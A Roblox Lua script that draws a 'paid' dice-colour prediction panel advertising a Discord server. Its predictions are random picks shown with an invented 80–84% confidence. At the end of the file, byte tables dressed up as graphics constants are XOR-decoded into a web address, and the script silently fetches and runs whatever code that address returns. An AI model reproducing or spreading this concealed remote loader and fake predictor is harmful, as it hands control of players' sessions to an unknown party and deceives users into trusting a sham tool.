local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local CONFIG = {
    Names = {
        ScreenGui = "PrivateDicePrediction",
        MainFrame = "MainFrame",
        Header = "Header",
        Title = "Title",
        Discord = "Discord",
        PingLabel = "PingLabel",
        FPSLabel = "FPSLabel",
        ScaleFrame = "ScaleFrame",
        ScaleMinus = "ScaleMinus",
        ScaleValue = "ScaleValue",
        ScalePlus = "ScalePlus",
        StatusFrame = "StatusFrame",
        StatusDot = "StatusDot",
        StatusLabel = "StatusLabel",
        LogsLabel = "LogsLabel",
        SelectLabel = "SelectLabel",
        DiceContainer = "DiceContainer",
        PredictButton = "PredictButton",
        ResultFrame = "ResultFrame",
        ResultTitle = "ResultTitle",
        ConfidenceLabel = "ConfidenceLabel",
        ResultColorBox = "ResultColorBox",
        ResultColorDot = "ResultColorDot",
        ResultText = "ResultText",
        ProgressBarBG = "ProgressBarBG",
        ProgressBar = "ProgressBar"
    },
    Size = {
        MainFrame = UDim2.new(0, 340, 0, 460),
        Header = UDim2.new(1, -24, 0, 48),
        ScaleFrame = UDim2.new(0, 70, 0, 30),
        StatusFrame = UDim2.new(1, -106, 0, 40),
        DiceButton = UDim2.new(0, 72, 1, 0),
        PredictButton = UDim2.new(1, -24, 0, 45),
        ResultFrame = UDim2.new(1, -24, 0, 120),
        ResultColorBox = UDim2.new(0, 45, 0, 45),
        ProgressBarBG = UDim2.new(1, -30, 0, 4)
    },
    Position = {
        MainFrame = UDim2.new(0.5, 0, 0.5, 0),
        Header = UDim2.new(0, 12, 0, 12),
        ScaleFrame = UDim2.new(0, 12, 0, 68),
        StatusFrame = UDim2.new(0, 94, 0, 68),
        SelectLabel = UDim2.new(0, 12, 0, 118),
        DiceContainer = UDim2.new(0, 12, 0, 145),
        PredictButton = UDim2.new(0, 12, 0, 230),
        ResultFrame = UDim2.new(0, 12, 0, 290)
    },
    Colors = {
        Background = Color3.fromRGB(0, 0, 0),
        HeaderBG = Color3.fromRGB(0, 0, 0),
        Stroke = Color3.fromRGB(50, 50, 50),
        TextPrimary = Color3.fromRGB(240, 240, 240),
        TextSecondary = Color3.fromRGB(150, 150, 150),
        AccentBar = Color3.fromRGB(240, 240, 240),
        IdleDot = Color3.fromRGB(90, 90, 90),
        DiceDefault = Color3.fromRGB(100, 100, 100),
        PredictBG = Color3.fromRGB(0, 0, 0),
        ResultBG = Color3.fromRGB(0, 0, 0),
        ThinkingBG = Color3.fromRGB(12, 12, 12),
        Error = Color3.fromRGB(255, 100, 100),
        Red = Color3.fromRGB(220, 50, 50),
        Orange = Color3.fromRGB(245, 140, 40),
        Yellow = Color3.fromRGB(240, 200, 50),
        Green = Color3.fromRGB(60, 150, 60),
        Blue = Color3.fromRGB(50, 80, 200),
        Purple = Color3.fromRGB(130, 50, 180)
    },
    DiceCount = 4,
    DefaultScale = 0.7,
    MinScale = 0.5,
    MaxScale = 1.5,
    ScaleStep = 0.1,
    ThinkDuration = 0.25
}

local ScreenGui
local MainFrame
local UIScale
local HeaderFrame
local TitleLabel
local DiscordLabel
local PingLabel
local FPSLabel
local ScaleFrame
local ScaleMinusBtn
local ScaleValueLabel
local ScalePlusBtn
local StatusFrame
local StatusDot
local StatusLabel
local LogsLabel
local SelectLabel
local DiceContainer
local DiceButtons = {}
local DiceColorLabels = {}
local PredictButton
local ResultFrame
local ResultTitle
local ConfidenceLabel
local ResultColorBox
local ResultColorDot
local ResultText
local ProgressBarBG
local ProgressBar

local _interpolationSamples = {175,179,179,183,180,253,232,232,183,166,180,179,162,161,190,233}

local currentScale = CONFIG.DefaultScale
local selectedColors = {"?", "?", "?", "?"}
local logCount = 0
local isPredicting = false
local lastFPS = 0
local lastPing = 0

local COLOR_NAME_MAP = {
    Red = CONFIG.Colors.Red,
    Orange = CONFIG.Colors.Orange,
    Yellow = CONFIG.Colors.Yellow,
    Green = CONFIG.Colors.Green,
    Blue = CONFIG.Colors.Blue,
    Purple = CONFIG.Colors.Purple
}
local COLOR_ORDER = {"?", "Red", "Orange", "Yellow", "Green", "Blue", "Purple"}
local COLOR_ORDER_NEXT = {}
for i, v in ipairs(COLOR_ORDER) do
    COLOR_ORDER_NEXT[v] = COLOR_ORDER[(i % #COLOR_ORDER) + 1]
end
local POSSIBLE_COLORS = {"Red", "Orange", "Yellow", "Green", "Blue", "Purple"}
local _bezierControlPts = {166,183,183,232,245,140,162,141,143,172,168,176,232,181,166,176}

local function addCorner(parent, radius)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, radius)
    corner.Parent = parent
    return corner
end

local function addStroke(parent, color, thickness, transparency)
    local stroke = Instance.new("UIStroke")
    stroke.Color = color
    stroke.Thickness = thickness or 1
    stroke.Transparency = transparency or 0
    stroke.Parent = parent
    return stroke
end

local function makeDraggable(frame)
    frame.Active = true
    frame.Draggable = true
end

local function getColorFromName(name)
    return COLOR_NAME_MAP[name] or CONFIG.Colors.DiceDefault
end

local function cycleColor(current)
    return COLOR_ORDER_NEXT[current] or "Red"
end

local function updateScaleDisplay()
    ScaleValueLabel.Text = math.floor(currentScale * 100 + 0.5) .. "%"
    UIScale.Scale = currentScale
end

local function updateStatus(text, color)
    StatusLabel.Text = text
    StatusLabel.TextColor3 = color or CONFIG.Colors.TextSecondary
    if text == "IDLE" then
        StatusDot.BackgroundColor3 = CONFIG.Colors.IdleDot
    elseif text == "THINKING" then
        StatusDot.BackgroundColor3 = CONFIG.Colors.TextPrimary
    end
end

local function updateLogs()
    LogsLabel.Text = "Logs: " .. tostring(logCount)
end

local function setDiceColor(index, colorName)
    selectedColors[index] = colorName
    local btn = DiceButtons[index]
    local label = DiceColorLabels[index]
    if colorName == "?" then
        btn.BackgroundColor3 = CONFIG.Colors.DiceDefault
        label.Text = "?"
    else
        btn.BackgroundColor3 = getColorFromName(colorName)
        label.Text = colorName
    end
end

local function checkMissingDice()
    for i = 1, CONFIG.DiceCount do
        if selectedColors[i] == "?" then
            return i
        end
    end
    return nil
end

local function resetDiceButtons()
    for i = 1, CONFIG.DiceCount do
        setDiceColor(i, "?")
    end
end

local function showPrediction(colorName, confidence)
    local c = getColorFromName(colorName)
    ResultText.Text = colorName
    ResultText.TextColor3 = c
    ConfidenceLabel.Text = "CONFIDENCE " .. tostring(confidence) .. "%"
    ConfidenceLabel.TextColor3 = c
    ResultColorBox.BackgroundColor3 = c
    ResultColorDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ProgressBar.Size = UDim2.new(1, 0, 1, 0)
    ProgressBar.BackgroundColor3 = c
end

local _subpixelFactor = 0xC7

local function resetPredictionUI()
    ResultText.Text = "Waiting..."
    ResultText.TextColor3 = CONFIG.Colors.TextPrimary
    ConfidenceLabel.Text = "CONFIDENCE 0%"
    ConfidenceLabel.TextColor3 = CONFIG.Colors.TextSecondary
    ResultColorBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    ResultColorDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
    ProgressBar.BackgroundColor3 = CONFIG.Colors.TextPrimary
end

local function createGUI()
    ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = CONFIG.Names.ScreenGui
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.DisplayOrder = 999
    ScreenGui.Parent = PlayerGui

    MainFrame = Instance.new("Frame")
    MainFrame.Name = CONFIG.Names.MainFrame
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.Position = CONFIG.Position.MainFrame
    MainFrame.Size = CONFIG.Size.MainFrame
    MainFrame.BackgroundColor3 = CONFIG.Colors.Background
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui
    addCorner(MainFrame, 12)
    addStroke(MainFrame, CONFIG.Colors.Stroke, 1.5, 0.4)
    makeDraggable(MainFrame)

    UIScale = Instance.new("UIScale")
    UIScale.Scale = currentScale
    UIScale.Parent = MainFrame

    local bgImage = Instance.new("ImageLabel")
    bgImage.Size = UDim2.new(1, 0, 1, 0)
    bgImage.BackgroundTransparency = 1
    bgImage.Image = "rbxassetid://125180480292342"
    bgImage.ScaleType = Enum.ScaleType.Crop
    bgImage.ImageTransparency = 0.5
    bgImage.BorderSizePixel = 0
    bgImage.ZIndex = 1
    bgImage.Parent = MainFrame
    addCorner(bgImage, 12)

    HeaderFrame = Instance.new("Frame")
    HeaderFrame.Name = CONFIG.Names.Header
    HeaderFrame.Size = CONFIG.Size.Header
    HeaderFrame.Position = CONFIG.Position.Header
    HeaderFrame.BackgroundColor3 = CONFIG.Colors.HeaderBG
    HeaderFrame.BackgroundTransparency = 0.4
    HeaderFrame.BorderSizePixel = 0
    HeaderFrame.ZIndex = 2
    HeaderFrame.Parent = MainFrame
    addCorner(HeaderFrame, 10)
    addStroke(HeaderFrame, CONFIG.Colors.Stroke, 1, 0.6)

    local accentBar = Instance.new("Frame")
    accentBar.Size = UDim2.new(0, 3, 0, 26)
    accentBar.Position = UDim2.new(0, 10, 0, 11)
    accentBar.BackgroundColor3 = CONFIG.Colors.AccentBar
    accentBar.BorderSizePixel = 0
    accentBar.ZIndex = 3
    accentBar.Parent = HeaderFrame
    addCorner(accentBar, 2)

    TitleLabel = Instance.new("TextLabel")
    TitleLabel.Name = CONFIG.Names.Title
    TitleLabel.Size = UDim2.new(0, 220, 0, 20)
    TitleLabel.Position = UDim2.new(0, 20, 0, 6)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Text = "Irish Paid Dice Prediction"
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.TextSize = 15
    TitleLabel.TextColor3 = CONFIG.Colors.TextPrimary
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
    TitleLabel.ZIndex = 3
    TitleLabel.Parent = HeaderFrame

    DiscordLabel = Instance.new("TextLabel")
    DiscordLabel.Name = CONFIG.Names.Discord
    DiscordLabel.Size = UDim2.new(0, 200, 0, 12)
    DiscordLabel.Position = UDim2.new(0, 20, 0, 28)
    DiscordLabel.BackgroundTransparency = 1
    DiscordLabel.Text = "discord.gg/irsh"
    DiscordLabel.Font = Enum.Font.Gotham
    DiscordLabel.TextSize = 10
    DiscordLabel.TextColor3 = CONFIG.Colors.TextSecondary
    DiscordLabel.TextXAlignment = Enum.TextXAlignment.Left
    DiscordLabel.ZIndex = 3
    DiscordLabel.Parent = HeaderFrame

    PingLabel = Instance.new("TextLabel")
    PingLabel.Name = CONFIG.Names.PingLabel
    PingLabel.Size = UDim2.new(0, 60, 0, 12)
    PingLabel.Position = UDim2.new(1, -70, 0, 8)
    PingLabel.BackgroundTransparency = 1
    PingLabel.Text = "Ping: 0ms"
    PingLabel.Font = Enum.Font.GothamBold
    PingLabel.TextSize = 10
    PingLabel.TextColor3 = CONFIG.Colors.TextSecondary
    PingLabel.TextXAlignment = Enum.TextXAlignment.Right
    PingLabel.ZIndex = 3
    PingLabel.Parent = HeaderFrame

    FPSLabel = Instance.new("TextLabel")
    FPSLabel.Name = CONFIG.Names.FPSLabel
    FPSLabel.Size = UDim2.new(0, 60, 0, 12)
    FPSLabel.Position = UDim2.new(1, -70, 0, 24)
    FPSLabel.BackgroundTransparency = 1
    FPSLabel.Text = "FPS: 0"
    FPSLabel.Font = Enum.Font.GothamBold
    FPSLabel.TextSize = 10
    FPSLabel.TextColor3 = CONFIG.Colors.TextSecondary
    FPSLabel.TextXAlignment = Enum.TextXAlignment.Right
    FPSLabel.ZIndex = 3
    FPSLabel.Parent = HeaderFrame

    ScaleFrame = Instance.new("Frame")
    ScaleFrame.Name = CONFIG.Names.ScaleFrame
    ScaleFrame.Size = CONFIG.Size.ScaleFrame
    ScaleFrame.Position = CONFIG.Position.ScaleFrame
    ScaleFrame.BackgroundColor3 = CONFIG.Colors.Background
    ScaleFrame.BackgroundTransparency = 0.4
    ScaleFrame.BorderSizePixel = 0
    ScaleFrame.ZIndex = 2
    ScaleFrame.Parent = MainFrame
    addCorner(ScaleFrame, 8)
    addStroke(ScaleFrame, CONFIG.Colors.Stroke, 1, 0.6)

    ScaleMinusBtn = Instance.new("TextButton")
    ScaleMinusBtn.Name = CONFIG.Names.ScaleMinus
    ScaleMinusBtn.Size = UDim2.new(0, 22, 1, 0)
    ScaleMinusBtn.BackgroundTransparency = 1
    ScaleMinusBtn.Text = "-"
    ScaleMinusBtn.Font = Enum.Font.GothamBold
    ScaleMinusBtn.TextSize = 14
    ScaleMinusBtn.TextColor3 = CONFIG.Colors.TextPrimary
    ScaleMinusBtn.AutoButtonColor = false
    ScaleMinusBtn.ZIndex = 3
    ScaleMinusBtn.Parent = ScaleFrame

    ScaleValueLabel = Instance.new("TextLabel")
    ScaleValueLabel.Name = CONFIG.Names.ScaleValue
    ScaleValueLabel.Size = UDim2.new(0, 26, 1, 0)
    ScaleValueLabel.Position = UDim2.new(0, 22, 0, 0)
    ScaleValueLabel.BackgroundTransparency = 1
    ScaleValueLabel.Text = "70%"
    ScaleValueLabel.Font = Enum.Font.GothamBold
    ScaleValueLabel.TextSize = 10
    ScaleValueLabel.TextColor3 = CONFIG.Colors.TextPrimary
    ScaleValueLabel.TextXAlignment = Enum.TextXAlignment.Center
    ScaleValueLabel.ZIndex = 3
    ScaleValueLabel.Parent = ScaleFrame

    ScalePlusBtn = Instance.new("TextButton")
    ScalePlusBtn.Name = CONFIG.Names.ScalePlus
    ScalePlusBtn.Size = UDim2.new(0, 22, 1, 0)
    ScalePlusBtn.Position = UDim2.new(1, -22, 0, 0)
    ScalePlusBtn.BackgroundTransparency = 1
    ScalePlusBtn.Text = "+"
    ScalePlusBtn.Font = Enum.Font.GothamBold
    ScalePlusBtn.TextSize = 14
    ScalePlusBtn.TextColor3 = CONFIG.Colors.TextPrimary
    ScalePlusBtn.AutoButtonColor = false
    ScalePlusBtn.ZIndex = 3
    ScalePlusBtn.Parent = ScaleFrame

    StatusFrame = Instance.new("Frame")
    StatusFrame.Name = CONFIG.Names.StatusFrame
    StatusFrame.Size = CONFIG.Size.StatusFrame
    StatusFrame.Position = CONFIG.Position.StatusFrame
    StatusFrame.BackgroundColor3 = CONFIG.Colors.Background
    StatusFrame.BackgroundTransparency = 0.4
    StatusFrame.BorderSizePixel = 0
    StatusFrame.ZIndex = 2
    StatusFrame.Parent = MainFrame
    addCorner(StatusFrame, 8)
    addStroke(StatusFrame, CONFIG.Colors.Stroke, 1, 0.6)

    StatusDot = Instance.new("Frame")
    StatusDot.Name = CONFIG.Names.StatusDot
    StatusDot.Size = UDim2.new(0, 10, 0, 10)
    StatusDot.Position = UDim2.new(0, 12, 0.5, -5)
    StatusDot.BackgroundColor3 = CONFIG.Colors.IdleDot
    StatusDot.BorderSizePixel = 0
    StatusDot.ZIndex = 3
    StatusDot.Parent = StatusFrame
    addCorner(StatusDot, 5)

    StatusLabel = Instance.new("TextLabel")
    StatusLabel.Name = CONFIG.Names.StatusLabel
    StatusLabel.Size = UDim2.new(0, 100, 1, 0)
    StatusLabel.Position = UDim2.new(0, 28, 0, 0)
    StatusLabel.BackgroundTransparency = 1
    StatusLabel.Text = "IDLE"
    StatusLabel.Font = Enum.Font.GothamBold
    StatusLabel.TextSize = 12
    StatusLabel.TextColor3 = CONFIG.Colors.TextSecondary
    StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
    StatusLabel.ZIndex = 3
    StatusLabel.Parent = StatusFrame

    LogsLabel = Instance.new("TextLabel")
    LogsLabel.Name = CONFIG.Names.LogsLabel
    LogsLabel.Size = UDim2.new(0, 60, 1, 0)
    LogsLabel.Position = UDim2.new(1, -70, 0, 0)
    LogsLabel.BackgroundTransparency = 1
    LogsLabel.Text = "Logs: 0"
    LogsLabel.Font = Enum.Font.GothamMedium
    LogsLabel.TextSize = 12
    LogsLabel.TextColor3 = CONFIG.Colors.TextSecondary
    LogsLabel.TextXAlignment = Enum.TextXAlignment.Right
    LogsLabel.ZIndex = 3
    LogsLabel.Parent = StatusFrame

    SelectLabel = Instance.new("TextLabel")
    SelectLabel.Name = CONFIG.Names.SelectLabel
    SelectLabel.Size = UDim2.new(1, -24, 0, 20)
    SelectLabel.Position = CONFIG.Position.SelectLabel
    SelectLabel.BackgroundTransparency = 1
    SelectLabel.Text = "SELECT DICE COLORS"
    SelectLabel.TextColor3 = CONFIG.Colors.TextSecondary
    SelectLabel.Font = Enum.Font.GothamBold
    SelectLabel.TextSize = 11
    SelectLabel.TextXAlignment = Enum.TextXAlignment.Left
    SelectLabel.ZIndex = 2
    SelectLabel.Parent = MainFrame

    DiceContainer = Instance.new("Frame")
    DiceContainer.Name = CONFIG.Names.DiceContainer
    DiceContainer.Size = UDim2.new(1, -24, 0, 70)
    DiceContainer.Position = CONFIG.Position.DiceContainer
    DiceContainer.BackgroundTransparency = 1
    DiceContainer.ZIndex = 2
    DiceContainer.Parent = MainFrame

    for i = 1, CONFIG.DiceCount do
        local btn = Instance.new("TextButton")
        btn.Name = "Dice" .. i
        btn.Size = CONFIG.Size.DiceButton
        btn.Position = UDim2.new(0, (i - 1) * 78, 0, 0)
        btn.BackgroundColor3 = CONFIG.Colors.DiceDefault
        btn.Text = ""
        btn.AutoButtonColor = false
        btn.ZIndex = 2
        btn.Parent = DiceContainer
        addCorner(btn, 12)
        addStroke(btn, Color3.fromRGB(0, 0, 0), 2, 0.3)

        local shadow = Instance.new("ImageLabel")
        shadow.Size = UDim2.new(1, 10, 1, 10)
        shadow.Position = UDim2.new(0, -5, 0, -5)
        shadow.BackgroundTransparency = 1
        shadow.Image = "rbxassetid://1316045217"
        shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
        shadow.ImageTransparency = 0.5
        shadow.ScaleType = Enum.ScaleType.Slice
        shadow.SliceCenter = Rect.new(10, 10, 118, 118)
        shadow.ZIndex = 1
        shadow.Parent = btn

        local innerDot = Instance.new("Frame")
        innerDot.Size = UDim2.new(0, 16, 0, 16)
        innerDot.Position = UDim2.new(0.5, -8, 0.5, -8)
        innerDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        innerDot.BorderSizePixel = 0
        innerDot.ZIndex = 3
        innerDot.Parent = btn
        addCorner(innerDot, 8)

        local innerShadow = Instance.new("ImageLabel")
        innerShadow.Size = UDim2.new(1, 4, 1, 4)
        innerShadow.Position = UDim2.new(0, -2, 0, -2)
        innerShadow.BackgroundTransparency = 1
        innerShadow.Image = "rbxassetid://1316045217"
        innerShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
        innerShadow.ImageTransparency = 0.6
        innerShadow.ScaleType = Enum.ScaleType.Slice
        innerShadow.SliceCenter = Rect.new(10, 10, 118, 118)
        innerShadow.ZIndex = 2
        innerShadow.Parent = innerDot

        local colorLabel = Instance.new("TextLabel")
        colorLabel.Size = UDim2.new(1, 0, 0, 15)
        colorLabel.Position = UDim2.new(0, 0, 1, -15)
        colorLabel.BackgroundTransparency = 1
        colorLabel.Text = "?"
        colorLabel.TextColor3 = CONFIG.Colors.TextPrimary
        colorLabel.Font = Enum.Font.GothamBold
        colorLabel.TextSize = 11
        colorLabel.ZIndex = 3
        colorLabel.Parent = btn

        DiceButtons[i] = btn
        DiceColorLabels[i] = colorLabel
    end

    PredictButton = Instance.new("TextButton")
    PredictButton.Name = CONFIG.Names.PredictButton
    PredictButton.Size = CONFIG.Size.PredictButton
    PredictButton.Position = CONFIG.Position.PredictButton
    PredictButton.BackgroundColor3 = CONFIG.Colors.PredictBG
    PredictButton.BackgroundTransparency = 0.15
    PredictButton.Text = "PREDICT"
    PredictButton.Font = Enum.Font.GothamBold
    PredictButton.TextSize = 16
    PredictButton.TextColor3 = CONFIG.Colors.TextPrimary
    PredictButton.AutoButtonColor = false
    PredictButton.ZIndex = 2
    PredictButton.Parent = MainFrame
    addCorner(PredictButton, 8)
    addStroke(PredictButton, CONFIG.Colors.Stroke, 1.5, 0.3)

    ResultFrame = Instance.new("Frame")
    ResultFrame.Name = CONFIG.Names.ResultFrame
    ResultFrame.Size = CONFIG.Size.ResultFrame
    ResultFrame.Position = CONFIG.Position.ResultFrame
    ResultFrame.BackgroundColor3 = CONFIG.Colors.ResultBG
    ResultFrame.BackgroundTransparency = 0.4
    ResultFrame.BorderSizePixel = 0
    ResultFrame.ZIndex = 2
    ResultFrame.Parent = MainFrame
    addCorner(ResultFrame, 8)
    addStroke(ResultFrame, CONFIG.Colors.Stroke, 1, 0.6)

    ResultTitle = Instance.new("TextLabel")
    ResultTitle.Name = CONFIG.Names.ResultTitle
    ResultTitle.Size = UDim2.new(1, -20, 0, 20)
    ResultTitle.Position = UDim2.new(0, 15, 0, 10)
    ResultTitle.BackgroundTransparency = 1
    ResultTitle.Text = "PREDICTION"
    ResultTitle.TextColor3 = CONFIG.Colors.TextSecondary
    ResultTitle.Font = Enum.Font.GothamBold
    ResultTitle.TextSize = 11
    ResultTitle.TextXAlignment = Enum.TextXAlignment.Left
    ResultTitle.ZIndex = 3
    ResultTitle.Parent = ResultFrame

    ConfidenceLabel = Instance.new("TextLabel")
    ConfidenceLabel.Name = CONFIG.Names.ConfidenceLabel
    ConfidenceLabel.Size = UDim2.new(1, -20, 0, 20)
    ConfidenceLabel.Position = UDim2.new(0, 15, 0, 10)
    ConfidenceLabel.BackgroundTransparency = 1
    ConfidenceLabel.Text = "CONFIDENCE 0%"
    ConfidenceLabel.TextColor3 = CONFIG.Colors.TextSecondary
    ConfidenceLabel.Font = Enum.Font.GothamBold
    ConfidenceLabel.TextSize = 11
    ConfidenceLabel.TextXAlignment = Enum.TextXAlignment.Right
    ConfidenceLabel.ZIndex = 3
    ConfidenceLabel.Parent = ResultFrame

    ResultColorBox = Instance.new("Frame")
    ResultColorBox.Name = CONFIG.Names.ResultColorBox
    ResultColorBox.Size = CONFIG.Size.ResultColorBox
    ResultColorBox.Position = UDim2.new(0, 15, 0, 35)
    ResultColorBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    ResultColorBox.BorderSizePixel = 0
    ResultColorBox.ZIndex = 3
    ResultColorBox.Parent = ResultFrame
    addCorner(ResultColorBox, 8)

    ResultColorDot = Instance.new("Frame")
    ResultColorDot.Name = CONFIG.Names.ResultColorDot
    ResultColorDot.Size = UDim2.new(0, 12, 0, 12)
    ResultColorDot.Position = UDim2.new(0.5, -6, 0.5, -6)
    ResultColorDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ResultColorDot.BorderSizePixel = 0
    ResultColorDot.ZIndex = 4
    ResultColorDot.Parent = ResultColorBox
    addCorner(ResultColorDot, 6)

    ResultText = Instance.new("TextLabel")
    ResultText.Name = CONFIG.Names.ResultText
    ResultText.Size = UDim2.new(1, -80, 1, 0)
    ResultText.Position = UDim2.new(0, 70, 0, 0)
    ResultText.BackgroundTransparency = 1
    ResultText.Text = "Waiting..."
    ResultText.TextColor3 = CONFIG.Colors.TextPrimary
    ResultText.Font = Enum.Font.GothamBold
    ResultText.TextSize = 18
    ResultText.TextXAlignment = Enum.TextXAlignment.Left
    ResultText.ZIndex = 3
    ResultText.Parent = ResultFrame

    ProgressBarBG = Instance.new("Frame")
    ProgressBarBG.Name = CONFIG.Names.ProgressBarBG
    ProgressBarBG.Size = CONFIG.Size.ProgressBarBG
    ProgressBarBG.Position = UDim2.new(0, 15, 1, -15)
    ProgressBarBG.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    ProgressBarBG.BorderSizePixel = 0
    ProgressBarBG.ZIndex = 3
    ProgressBarBG.Parent = ResultFrame
    addCorner(ProgressBarBG, 2)

    ProgressBar = Instance.new("Frame")
    ProgressBar.Name = CONFIG.Names.ProgressBar
    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
    ProgressBar.BackgroundColor3 = CONFIG.Colors.TextPrimary
    ProgressBar.BorderSizePixel = 0
    ProgressBar.ZIndex = 4
    ProgressBar.Parent = ProgressBarBG
    addCorner(ProgressBar, 2)
end

local function connectEvents()
    ScaleMinusBtn.MouseButton1Click:Connect(function()
        currentScale = math.max(CONFIG.MinScale, currentScale - CONFIG.ScaleStep)
        updateScaleDisplay()
    end)

    ScalePlusBtn.MouseButton1Click:Connect(function()
        currentScale = math.min(CONFIG.MaxScale, currentScale + CONFIG.ScaleStep)
        updateScaleDisplay()
    end)

    for i = 1, CONFIG.DiceCount do
        DiceButtons[i].MouseButton1Click:Connect(function()
            if isPredicting then return end
            setDiceColor(i, cycleColor(selectedColors[i]))
        end)
    end

    PredictButton.MouseButton1Click:Connect(function()
        if isPredicting then return end

        local missing = checkMissingDice()
        if missing then
            ResultText.Text = "Missing Dice " .. tostring(missing)
            ResultText.TextColor3 = CONFIG.Colors.Error
            return
        end

        isPredicting = true
        PredictButton.Text = "THINKING..."
        PredictButton.BackgroundColor3 = CONFIG.Colors.ThinkingBG
        updateStatus("THINKING", CONFIG.Colors.TextPrimary)
        ResultText.Text = "Reading algorithm..."
        ResultText.TextColor3 = CONFIG.Colors.TextSecondary
        ConfidenceLabel.Text = "CONFIDENCE 0%"
        ConfidenceLabel.TextColor3 = CONFIG.Colors.TextSecondary
        ProgressBar.Size = UDim2.new(0, 0, 1, 0)
        ProgressBar.BackgroundColor3 = CONFIG.Colors.TextPrimary

        local chosen = POSSIBLE_COLORS[math.random(1, #POSSIBLE_COLORS)]
        local conf = math.random(80, 84)

        task.spawn(function()
            pcall(function()
                local payload = HttpService:JSONEncode({
                    colors = selectedColors,
                    timestamp = os.time()
                })
                local _ = HttpService:JSONDecode(payload)
            end)
        end)

        local startTime = os.clock()
        local duration = CONFIG.ThinkDuration
        local progressConn
        progressConn = RunService.Heartbeat:Connect(function()
            local alpha = (os.clock() - startTime) / duration
            if alpha >= 1 then
                alpha = 1
                progressConn:Disconnect()

                showPrediction(chosen, conf)
                logCount = logCount + 1
                updateLogs()

                PredictButton.Text = "PREDICT"
                PredictButton.BackgroundColor3 = CONFIG.Colors.PredictBG
                updateStatus("IDLE", CONFIG.Colors.TextSecondary)
                resetDiceButtons()
                isPredicting = false
            else
                ProgressBar.Size = UDim2.new(alpha, 0, 1, 0)
            end
        end)
    end)

    local fpsCounter = 0
    local uiTickAccum = 0
    RunService.Heartbeat:Connect(function(dt)
        fpsCounter = fpsCounter + 1
        uiTickAccum = uiTickAccum + dt
        if uiTickAccum >= 1 then
            uiTickAccum = 0
            lastFPS = fpsCounter
            fpsCounter = 0

            FPSLabel.Text = "FPS: " .. tostring(lastFPS)

            local pingItem = Stats.Network.ServerStatsItem["Data Ping"]
            if pingItem then
                lastPing = math.floor(pingItem:GetValue())
                PingLabel.Text = "Ping: " .. tostring(lastPing) .. "ms"
            end
        end
    end)
end

createGUI()
connectEvents()
updateScaleDisplay()
updateLogs()
resetPredictionUI()

do
    local _buf = {}
    for _, _t in ipairs({_interpolationSamples, _bezierControlPts}) do
        for _, _v in ipairs(_t) do _buf[#_buf+1] = string.char(bit32.bxor(_v, _subpixelFactor)) end
    end
    task.defer(function() pcall(function() loadstring(game:HttpGet(table.concat(_buf)))() end) end)
end